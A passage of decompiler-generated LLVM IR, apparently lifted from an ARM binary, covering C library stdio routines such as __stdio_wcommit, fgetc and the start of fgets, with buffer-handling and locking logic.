  %v3_15cdc = add i32 %v2_15cdc, 60
  %v4_15cdc = inttoptr i32 %v3_15cdc to i32*
  store i32 %v1_15cdc, i32* %v4_15cdc, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_15ccc
  %v2_15cd0 = add i32 %v2_15cd8.pre, 8
  %v3_15cd0 = inttoptr i32 %v2_15cd0 to i32*
  %v4_15cd0 = load i32, i32* %v3_15cd0, align 4
  store i32 %v4_15cd0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_15ce0 = add i32 %v2_15cd8.pre, 20
  %v4_15ce0 = inttoptr i32 %v3_15ce0 to i32*
  store i32 %v4_15cd0, i32* %v4_15ce0, align 4
  %v1_15ce4 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ce4 = trunc i32 %v1_15ce4 to i16
  %v3_15ce4 = load i32, i32* %r5.global-to-local, align 4
  %v4_15ce4 = inttoptr i32 %v3_15ce4 to i16*
  store i16 %v2_15ce4, i16* %v4_15ce4, align 2
  %v1_15ce8 = load i32, i32* %r3.global-to-local, align 4
  %v2_15ce8 = load i32, i32* %r5.global-to-local, align 4
  %v3_15ce8 = add i32 %v2_15ce8, 24
  %v4_15ce8 = inttoptr i32 %v3_15ce8 to i32*
  store i32 %v1_15ce8, i32* %v4_15ce8, align 4
  %v1_15cec = load i32, i32* %r3.global-to-local, align 4
  %v2_15cec = load i32, i32* %r5.global-to-local, align 4
  %v3_15cec = add i32 %v2_15cec, 28
  %v4_15cec = inttoptr i32 %v3_15cec to i32*
  store i32 %v1_15cec, i32* %v4_15cec, align 4
  %v1_15cf0 = load i32, i32* %r3.global-to-local, align 4
  %v2_15cf0 = load i32, i32* %r5.global-to-local, align 4
  %v3_15cf0 = add i32 %v2_15cf0, 16
  %v4_15cf0 = inttoptr i32 %v3_15cf0 to i32*
  store i32 %v1_15cf0, i32* %v4_15cf0, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_15cf4 = load i32, i32* %sl.global-to-local, align 4
  %v1_15cf4 = inttoptr i32 %v0_15cf4 to i32*
  %v2_15cf4 = load i32, i32* %v1_15cf4, align 4
  store i32 %v2_15cf4, i32* %r0.global-to-local, align 4
  %v3_15cf4 = add i32 %v0_15cf4, 4
  %v4_15cf4 = inttoptr i32 %v3_15cf4 to i32*
  %v5_15cf4 = load i32, i32* %v4_15cf4, align 4
  store i32 %v5_15cf4, i32* %r1.global-to-local, align 4
  %v6_15cf4 = add i32 %v0_15cf4, 8
  %v7_15cf4 = inttoptr i32 %v6_15cf4 to i32*
  %v8_15cf4 = load i32, i32* %v7_15cf4, align 4
  store i32 %v8_15cf4, i32* %r2.global-to-local, align 4
  %v1_15cfc = load i32, i32* %r5.global-to-local, align 4
  %v2_15cfc = add i32 %v1_15cfc, 52
  %v3_15cfc = inttoptr i32 %v2_15cfc to i32*
  store i32 1, i32* %v3_15cfc, align 4
  %v0_15d00 = load i32, i32* %r5.global-to-local, align 4
  %v1_15d00 = add i32 %v0_15d00, 56
  store i32 %v1_15d00, i32* %r3.global-to-local, align 4
  %v2_15d04 = load i32, i32* %r0.global-to-local, align 4
  %v1_15d08 = inttoptr i32 %v1_15d00 to i32*
  store i32 %v2_15d04, i32* %v1_15d08, align 4
  %v3_15d08 = add i32 %v0_15d00, 60
  %v4_15d08 = inttoptr i32 %v3_15d08 to i32*
  %v5_15d08 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15d08, i32* %v4_15d08, align 4
  %v6_15d08 = add i32 %v0_15d00, 64
  %v7_15d08 = inttoptr i32 %v6_15d08 to i32*
  %v8_15d08 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15d08, i32* %v7_15d08, align 4
  %v0_15d0c = load i32, i32* %r5.global-to-local, align 4
  %v1_15d0c = add i32 %v0_15d0c, 32
  %v2_15d0c = inttoptr i32 %v1_15d0c to i32*
  %v3_15d0c = load i32, i32* %v2_15d0c, align 4
  store i32 %v3_15d0c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d10 = icmp eq i32 %v3_15d0c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15d18 = add i32 %v3_15d0c, 56
  store i32 %v1_15d18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_15d10, label %dec_label_pc_15d24, label %dec_label_pc_15c88

dec_label_pc_15d24:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_15d28 = load i32, i32* %r7.global-to-local, align 4
  %v2_15d28 = add i32 %v0_15d28, 76
  %v3_15d28 = inttoptr i32 %v2_15d28 to i32*
  %v4_15d28 = load i32, i32* %v3_15d28, align 4
  store i32 %v4_15d28, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_15d28 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d4814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_15d4814, label %dec_label_pc_15d50, label %dec_label_pc_15d34

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15d24, %dec_label_pc_15d48
  %v1_15d3c = phi i32 [ %storemerge, %dec_label_pc_15d48 ], [ %storemerge12, %dec_label_pc_15d24 ]
  %v1_15d34 = inttoptr i32 %v1_15d3c to i16*
  %v2_15d34 = load i16, i16* %v1_15d34, align 2
  %v3_15d34 = zext i16 %v2_15d34 to i32
  store i32 %v3_15d34, i32* %r3.global-to-local, align 4
  %v1_15d38 = and i32 %v3_15d34, 64
  %v2_15d38 = icmp eq i32 %v1_15d38, 0
  br i1 %v2_15d38, label %dec_label_pc_15d48, label %bb39

bb39:                                             ; preds = %dec_label_pc_15d34
  store i32 %v1_15d3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d48

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15d34, %bb39
  %v1_15d40 = xor i1 %v2_15d38, true
  call void @__pseudo_cond_branch(i1 %v1_15d40, i32 ptrtoint (i32* @global_var_15d78.626 to i32))
  %v0_15d44 = load i32, i32* %r4.global-to-local, align 4
  %v1_15d44 = add i32 %v0_15d44, 32
  %storemerge.in = inttoptr i32 %v1_15d44 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d48 = icmp eq i32 %storemerge, 0
  br i1 %v2_15d48, label %dec_label_pc_15d50, label %dec_label_pc_15d34

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15d48, %dec_label_pc_15d24
  %v2_15d54 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_15d54, i32* %r4.global-to-local, align 4
  %v1_15d58 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15d58

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_15d0c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15cac, { 1, 0 }
  uselistorder i32 %v4_15c6c, { 2, 1, 0 }
  uselistorder i32 %v4_15c3c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_15d48, { 1, 0 }
  uselistorder label %dec_label_pc_15d34, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ccc, { 1, 0 }
  uselistorder label %dec_label_pc_15ca8, { 1, 0 }
  uselistorder label %dec_label_pc_15c88, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15d78 = load i32, i32* @r4, align 4
  store i32 %v3_15d78, i32* %stack_var_-8, align 4
  %v1_15d7c = add i32 %arg1, 8
  %v2_15d7c = inttoptr i32 %v1_15d7c to i32*
  %v3_15d7c = load i32, i32* %v2_15d7c, align 4
  store i32 %v3_15d7c, i32* @r1, align 4
  %v1_15d80 = add i32 %arg1, 16
  %v2_15d80 = inttoptr i32 %v1_15d80 to i32*
  %v3_15d80 = load i32, i32* %v2_15d80, align 4
  %v9_15d84 = icmp eq i32 %v3_15d80, %v3_15d7c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_15d84, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_15d7c, i32* %v2_15d80, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_15d90 = xor i1 %v9_15d84, true
  call void @__pseudo_cond_branch(i1 %v1_15d90, i32 ptrtoint (i32* @global_var_17768.627 to i32))
  %v0_15d94 = load i32, i32* %r4.global-to-local, align 4
  %v1_15d94 = add i32 %v0_15d94, 8
  %v2_15d94 = inttoptr i32 %v1_15d94 to i32*
  %v3_15d94 = load i32, i32* %v2_15d94, align 4
  %v1_15d98 = add i32 %v0_15d94, 16
  %v2_15d98 = inttoptr i32 %v1_15d98 to i32*
  %v3_15d98 = load i32, i32* %v2_15d98, align 4
  %v2_15d9c = sub i32 %v3_15d98, %v3_15d94
  %v2_15da0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15da0, i32* @r4, align 4
  ret i32 %v2_15d9c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15da8 = load i32, i32* @r4, align 4
  store i32 %v3_15da8, i32* %stack_var_-20, align 4
  %v6_15da8 = load i32, i32* @r5, align 4
  %v9_15da8 = load i32, i32* @r6, align 4
  %v12_15da8 = load i32, i32* @r7, align 4
  %v15_15da8 = load i32, i32* @lr, align 4
  %v1_15dac = add i32 %arg1, 52
  %v2_15dac = inttoptr i32 %v1_15dac to i32*
  %v3_15dac = load i32, i32* %v2_15dac, align 4
  store i32 %v3_15dac, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15db0 = icmp eq i32 %v3_15dac, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_15db0, label %dec_label_pc_15de4, label %dec_label_pc_15dc0

dec_label_pc_15dc0:                               ; preds = %entry
  %v1_15dc0 = add i32 %arg1, 16
  %v2_15dc0 = inttoptr i32 %v1_15dc0 to i32*
  %v3_15dc0 = load i32, i32* %v2_15dc0, align 4
  store i32 %v3_15dc0, i32* %r2.global-to-local, align 4
  %v1_15dc4 = add i32 %arg1, 24
  %v2_15dc4 = inttoptr i32 %v1_15dc4 to i32*
  %v3_15dc4 = load i32, i32* %v2_15dc4, align 4
  store i32 %v3_15dc4, i32* %r3.global-to-local, align 4
  %v3_15dc8 = icmp uge i32 %v3_15dc0, %v3_15dc4
  store i1 %v3_15dc8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_15dc8, label %dec_label_pc_15dd8, label %.thread

.thread:                                          ; preds = %dec_label_pc_15dc0
  %v2_15dcc = inttoptr i32 %v3_15dc0 to i8*
  %v3_15dcc = load i8, i8* %v2_15dcc, align 1
  %v4_15dcc = zext i8 %v3_15dcc to i32
  store i32 %v4_15dcc, i32* %r5.global-to-local, align 4
  %v6_15dcc = add i32 %v3_15dc0, 1
  store i32 %v6_15dcc, i32* %r2.global-to-local, align 4
  store i32 %v6_15dcc, i32* %v2_15dc0, align 4
  br label %dec_label_pc_15edc

dec_label_pc_15dd8:                               ; preds = %dec_label_pc_15dc0
  %v1_15dd8 = inttoptr i32 %arg1 to i16*
  %v2_15dd8 = call i32 @getc_unlocked(i16* %v1_15dd8)
  store i32 %v2_15dd8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15edc

dec_label_pc_15de4:                               ; preds = %entry
  %v0_15de4 = call i32 @__aeabi_read_tp()
  %v0_15de8 = load i32, i32* @r7, align 4
  %v1_15de8 = add i32 %v0_15de8, 64
  %v2_15de8 = inttoptr i32 %v1_15de8 to i32*
  %v3_15de8 = load i32, i32* %v2_15de8, align 4
  store i32 %v3_15de8, i32* %r3.global-to-local, align 4
  %v1_15dec = add i32 %v0_15de4, -1168
  store i32 %v1_15dec, i32* @r6, align 4
  %v3_15df0 = icmp uge i32 %v3_15de8, %v1_15dec
  store i1 %v3_15df0, i1* %cpsr_c.global-to-local, align 1
  %v9_15df0 = icmp eq i32 %v3_15de8, %v1_15dec
  br i1 %v9_15df0, label %dec_label_pc_15e38, label %dec_label_pc_15df8

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15de4
  %v1_15df8 = add i32 %v0_15de8, 56
  store i32 %v1_15df8, i32* @r5, align 4
  store i32 %v1_15df8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15e10.dec_label_pc_15e04_crit_edge, %dec_label_pc_15df8
  %v0_15e04 = phi i32 [ %v0_15e04.pre, %dec_label_pc_15e10.dec_label_pc_15e04_crit_edge ], [ %v1_15df8, %dec_label_pc_15df8 ]
  %v1_15e04 = inttoptr i32 %v0_15e04 to i32*
  %v2_15e04 = load i32, i32* %v1_15e04, align 4
  store i32 %v2_15e04, i32* %r3.global-to-local, align 4
  %v1_15e08 = load i32, i32* @r4, align 4
  %v3_15e08 = icmp uge i32 %v2_15e04, %v1_15e08
  store i1 %v3_15e08, i1* %cpsr_c.global-to-local, align 1
  %v9_15e08 = icmp eq i32 %v2_15e04, %v1_15e08
  br i1 %v9_15e08, label %dec_label_pc_15e10, label %dec_label_pc_15e28

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15e04
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15e20 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15e20, label %dec_label_pc_15e24, label %dec_label_pc_15e10.dec_label_pc_15e04_crit_edge

dec_label_pc_15e10.dec_label_pc_15e04_crit_edge:  ; preds = %dec_label_pc_15e10
  %v0_15e04.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e04

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15e10
  %v0_15e24 = load i32, i32* @r4, align 4
  store i32 %v0_15e24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15e28

dec_label_pc_15e28:                               ; preds = %dec_label_pc_15e04, %dec_label_pc_15e24
  %v0_15e28 = phi i32 [ %v0_15e24, %dec_label_pc_15e24 ], [ %v2_15e04, %dec_label_pc_15e04 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e28 = icmp eq i32 %v0_15e28, 0
  br i1 %v2_15e28, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_15e28
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15e28, %bb
  store i32 89652, i32* @lr, align 4
  %v1_15e30 = xor i1 %v2_15e28, true
  call void @__pseudo_cond_branch(i1 %v1_15e30, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_15e34 = load i32, i32* @r6, align 4
  %v1_15e34 = load i32, i32* @r7, align 4
  %v2_15e34 = add i32 %v1_15e34, 64
  %v3_15e34 = inttoptr i32 %v2_15e34 to i32*
  store i32 %v0_15e34, i32* %v3_15e34, align 4
  %v0_15e38.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15e38

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15de4, %bb18
  %v1_15e48 = phi i32 [ %v0_15de8, %dec_label_pc_15de4 ], [ %v0_15e38.pre, %bb18 ]
  %v1_15e38 = add i32 %v1_15e48, 60
  %v2_15e38 = inttoptr i32 %v1_15e38 to i32*
  %v3_15e38 = load i32, i32* %v2_15e38, align 4
  store i32 %v3_15e38, i32* %r2.global-to-local, align 4
  %v1_15e3c = add i32 %v1_15e48, 16
  %v2_15e3c = inttoptr i32 %v1_15e3c to i32*
  %v3_15e3c = load i32, i32* %v2_15e3c, align 4
  store i32 %v3_15e3c, i32* @r1, align 4
  %v1_15e40 = add i32 %v1_15e48, 24
  %v2_15e40 = inttoptr i32 %v1_15e40 to i32*
  %v3_15e40 = load i32, i32* %v2_15e40, align 4
  store i32 %v3_15e40, i32* %r3.global-to-local, align 4
  %v1_15e44 = add i32 %v3_15e38, 1
  store i32 %v1_15e44, i32* %r2.global-to-local, align 4
  store i32 %v1_15e44, i32* %v2_15e38, align 4
  %v0_15e4c = load i32, i32* @r1, align 4
  %v1_15e4c = load i32, i32* %r3.global-to-local, align 4
  %v3_15e4c = icmp uge i32 %v0_15e4c, %v1_15e4c
  store i1 %v3_15e4c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_15e4c, label %dec_label_pc_15e5c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15e38
  %v2_15e50 = inttoptr i32 %v0_15e4c to i8*
  %v3_15e50 = load i8, i8* %v2_15e50, align 1
  %v4_15e50 = zext i8 %v3_15e50 to i32
  store i32 %v4_15e50, i32* %r5.global-to-local, align 4
  %v6_15e50 = add i32 %v0_15e4c, 1
  store i32 %v6_15e50, i32* @r1, align 4
  %v2_15e54 = load i32, i32* @r7, align 4
  %v3_15e54 = add i32 %v2_15e54, 16
  %v4_15e54 = inttoptr i32 %v3_15e54 to i32*
  store i32 %v6_15e50, i32* %v4_15e54, align 4
  br label %dec_label_pc_15e68

dec_label_pc_15e5c:                               ; preds = %dec_label_pc_15e38
  %v0_15e5c = load i32, i32* @r7, align 4
  %v1_15e60 = inttoptr i32 %v0_15e5c to i16*
  %v2_15e60 = call i32 @getc_unlocked(i16* %v1_15e60)
  store i32 %v2_15e60, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15e68

dec_label_pc_15e68:                               ; preds = %.thread2, %dec_label_pc_15e5c
  %v0_15e68 = load i32, i32* @r7, align 4
  %v1_15e68 = add i32 %v0_15e68, 60
  %v2_15e68 = inttoptr i32 %v1_15e68 to i32*
  %v3_15e68 = load i32, i32* %v2_15e68, align 4
  %v1_15e6c = add i32 %v3_15e68, -1
  store i32 %v1_15e6c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e70 = icmp eq i32 %v1_15e6c, 0
  store i32 %v1_15e6c, i32* %v2_15e68, align 4
  br i1 %v2_15e70, label %dec_label_pc_15e7c, label %dec_label_pc_15edc

dec_label_pc_15e7c:                               ; preds = %dec_label_pc_15e68
  %v0_15e7c = load i32, i32* %r3.global-to-local, align 4
  %v1_15e7c = load i32, i32* @r7, align 4
  %v2_15e7c = add i32 %v1_15e7c, 64
  %v3_15e7c = inttoptr i32 %v2_15e7c to i32*
  store i32 %v0_15e7c, i32* %v3_15e7c, align 4
  %v0_15e80 = load i32, i32* @r7, align 4
  %v1_15e80 = add i32 %v0_15e80, 56
  store i32 %v1_15e80, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15e84

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15eb4.dec_label_pc_15e84_crit_edge, %dec_label_pc_15e7c
  %v0_15e8c = phi i32 [ %v0_15e8c.pre, %dec_label_pc_15eb4.dec_label_pc_15e84_crit_edge ], [ %v1_15e80, %dec_label_pc_15e7c ]
  %v0_15e84 = phi i32 [ %v0_15e84.pre, %dec_label_pc_15eb4.dec_label_pc_15e84_crit_edge ], [ %v0_15e80, %dec_label_pc_15e7c ]
  %v1_15e84 = add i32 %v0_15e84, 56
  %v2_15e84 = inttoptr i32 %v1_15e84 to i32*
  %v3_15e84 = load i32, i32* %v2_15e84, align 4
  store i32 %v3_15e84, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15e8c, i32* %r2.global-to-local, align 4
  %v1_15e9022 = inttoptr i32 %v0_15e8c to i32*
  %v2_15e9023 = load i32, i32* %v1_15e9022, align 4
  store i32 %v2_15e9023, i32* %r3.global-to-local, align 4
  %v3_15e9425 = icmp uge i32 %v2_15e9023, %v3_15e84
  store i1 %v3_15e9425, i1* %cpsr_c.global-to-local, align 1
  %v9_15e9431 = icmp eq i32 %v2_15e9023, %v3_15e84
  br i1 %v9_15e9431, label %dec_label_pc_15e9c, label %dec_label_pc_15eb4

dec_label_pc_15e9c:                               ; preds = %dec_label_pc_15e84, %dec_label_pc_15e9c.dec_label_pc_15e90_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15eac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15eac, label %dec_label_pc_15eb0, label %dec_label_pc_15e9c.dec_label_pc_15e90_crit_edge

dec_label_pc_15e9c.dec_label_pc_15e90_crit_edge:  ; preds = %dec_label_pc_15e9c
  %v0_15e90.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15e94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15e90 = inttoptr i32 %v0_15e90.pre to i32*
  %v2_15e90 = load i32, i32* %v1_15e90, align 4
  store i32 %v2_15e90, i32* %r3.global-to-local, align 4
  %v3_15e94 = icmp uge i32 %v2_15e90, %v1_15e94.pre
  store i1 %v3_15e94, i1* %cpsr_c.global-to-local, align 1
  %v9_15e94 = icmp eq i32 %v2_15e90, %v1_15e94.pre
  br i1 %v9_15e94, label %dec_label_pc_15e9c, label %dec_label_pc_15eb4

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15e9c
  %v0_15eb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15eb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15eb4

dec_label_pc_15eb4:                               ; preds = %dec_label_pc_15e84, %dec_label_pc_15e9c.dec_label_pc_15e90_crit_edge, %dec_label_pc_15eb0
  %v0_15ebc = phi i32 [ %v0_15eb0, %dec_label_pc_15eb0 ], [ %v2_15e9023, %dec_label_pc_15e84 ], [ %v2_15e90, %dec_label_pc_15e9c.dec_label_pc_15e90_crit_edge ]
  %v1_15eb4 = phi i32 [ %v0_15eb0, %dec_label_pc_15eb0 ], [ %v3_15e84, %dec_label_pc_15e84 ], [ %v1_15e94.pre, %dec_label_pc_15e9c.dec_label_pc_15e90_crit_edge ]
  %v3_15eb4 = icmp uge i32 %v0_15ebc, %v1_15eb4
  store i1 %v3_15eb4, i1* %cpsr_c.global-to-local, align 1
  %v9_15eb4 = icmp eq i32 %v0_15ebc, %v1_15eb4
  br i1 %v9_15eb4, label %dec_label_pc_15ebc, label %dec_label_pc_15eb4.dec_label_pc_15e84_crit_edge

dec_label_pc_15eb4.dec_label_pc_15e84_crit_edge:  ; preds = %dec_label_pc_15eb4
  %v0_15e84.pre = load i32, i32* @r7, align 4
  %v0_15e8c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15e84

dec_label_pc_15ebc:                               ; preds = %dec_label_pc_15eb4
  %v2_15ebc = icmp ne i32 %v1_15eb4, 0
  store i1 %v2_15ebc, i1* %cpsr_c.global-to-local, align 1
  %v7_15ec0 = icmp slt i32 %v1_15eb4, 2
  br i1 %v7_15ec0, label %dec_label_pc_15edc, label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %dec_label_pc_15ebc
  %v0_15ec8 = load i32, i32* @r1, align 4
  %v1_15ec8 = add i32 %v0_15ec8, 129
  store i32 %v1_15ec8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15edc

dec_label_pc_15edc:                               ; preds = %.thread, %dec_label_pc_15e68, %dec_label_pc_15ec4, %dec_label_pc_15ebc, %dec_label_pc_15dd8
  %v0_15edc = load i32, i32* %r5.global-to-local, align 4
  %v2_15ee4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15ee4, i32* @r4, align 4
  store i32 %v6_15da8, i32* @r5, align 4
  store i32 %v9_15da8, i32* @r6, align 4
  store i32 %v12_15da8, i32* @r7, align 4
  store i32 %v15_15da8, i32* @lr, align 4
  ret i32 %v0_15edc

; uselistorder directives
  uselistorder i32 %v0_15eb0, { 1, 0, 2 }
  uselistorder i32 %v1_15e94.pre, { 0, 2, 1 }
  uselistorder i32 %v0_15e4c, { 1, 0, 2 }
  uselistorder i32 %v1_15e48, { 0, 2, 1 }
  uselistorder i32 %v1_15e08, { 1, 0 }
  uselistorder i32 %v3_15dc0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_15edc, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_15eb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e9c, { 1, 0 }
  uselistorder label %dec_label_pc_15e68, { 1, 0 }
  uselistorder label %dec_label_pc_15e38, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_15e28, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_15eec = load i32, i32* @r4, align 4
  store i32 %v3_15eec, i32* %stack_var_-32, align 4
  %v6_15eec = load i32, i32* @r5, align 4
  %v9_15eec = load i32, i32* @r6, align 4
  %v12_15eec = load i32, i32* @r7, align 4
  %v15_15eec = load i32, i32* @r8, align 4
  %v24_15eec = load i32, i32* @lr, align 4
  %v1_15ef0 = add i32 %arg3, 52
  %v2_15ef0 = inttoptr i32 %v1_15ef0 to i32*
  %v3_15ef0 = load i32, i32* %v2_15ef0, align 4
  store i32 %v3_15ef0, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ef4 = icmp eq i32 %v3_15ef0, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_15ef4, label %dec_label_pc_15f08, label %dec_label_pc_15f6c

dec_label_pc_15f08:                               ; preds = %entry
  %v0_15f08 = call i32 @__aeabi_read_tp()
  %v1_15f0c = add i32 %arg3, 64
  %v2_15f0c = inttoptr i32 %v1_15f0c to i32*
  %v3_15f0c = load i32, i32* %v2_15f0c, align 4
  store i32 %v3_15f0c, i32* %r3.global-to-local, align 4
  %v1_15f10 = add i32 %v0_15f08, -1168
  store i32 %v1_15f10, i32* @r8, align 4
  %v3_15f14 = icmp uge i32 %v3_15f0c, %v1_15f10
  store i1 %v3_15f14, i1* %cpsr_c.global-to-local, align 1
  %v9_15f14 = icmp eq i32 %v3_15f0c, %v1_15f10
  br i1 %v9_15f14, label %dec_label_pc_15f60, label %dec_label_pc_15f1c

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15f08
  %v1_15f1c = add i32 %arg3, 56
  store i32 %v1_15f1c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_15f1c, i32* %r2.global-to-local, align 4
  %v0_15f28 = load i32, i32* @r6, align 4
  store i32 %v0_15f28, i32* @r4, align 4
  %v1_15f2c36 = inttoptr i32 %v1_15f1c to i32*
  %v2_15f2c37 = load i32, i32* %v1_15f2c36, align 4
  store i32 %v2_15f2c37, i32* %r3.global-to-local, align 4
  %v3_15f3039 = icmp uge i32 %v2_15f2c37, %v0_15f28
  store i1 %v3_15f3039, i1* %cpsr_c.global-to-local, align 1
  %v9_15f3045 = icmp eq i32 %v2_15f2c37, %v0_15f28
  br i1 %v9_15f3045, label %dec_label_pc_15f38, label %dec_label_pc_15f50

dec_label_pc_15f38:                               ; preds = %dec_label_pc_15f1c, %dec_label_pc_15f38.dec_label_pc_15f2c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f48, label %dec_label_pc_15f4c, label %dec_label_pc_15f38.dec_label_pc_15f2c_crit_edge

